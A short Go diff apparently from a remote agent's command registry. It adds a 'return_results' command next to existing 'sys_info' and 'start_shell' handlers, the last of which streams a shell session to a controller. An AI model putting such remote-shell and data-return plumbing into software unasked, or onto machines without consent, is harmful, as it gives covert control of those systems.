@@ -20,8 +20,9 @@ const (
 type BuiltInCommand string
 
 const (
-	SysInfoCommand    BuiltInCommand = "sys_info"
-	StartShellCommand BuiltInCommand = "start_shell"
+	SysInfoCommand       BuiltInCommand = "sys_info"
+	StartShellCommand    BuiltInCommand = "start_shell"
+	ReturnResultsCommand BuiltInCommand = "return_results"
 )
 
 func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport transport.ITransportProtocol, streamingTransport local_models.IStreamingTransport) {
@@ -31,6 +32,10 @@ func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queu
 
 	registry.RegisterHandler(string(StartShellCommand), func(cmd models.Command) models.CommandResult {
 		return startShellHandler(cmd, resultsQueue, streamingTransport)
+	})
+
+	registry.RegisterHandler(string(ReturnResultsCommand), func(cmd models.Command) models.CommandResult {
+		return returnResultsHandler(cmd, transport)
 	})
 }
 
@@ -119,4 +124,9 @@ func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, stre
 			Output: map[string]string{"error": "Shell session timeout"},
 		}
 	}
+}
+
+func returnResultsHandler(cmd models.Command, transport transport.ITransportProtocol) models.CommandResult {
+	transport.SendResults()
+	return models.CommandResult{}
 }
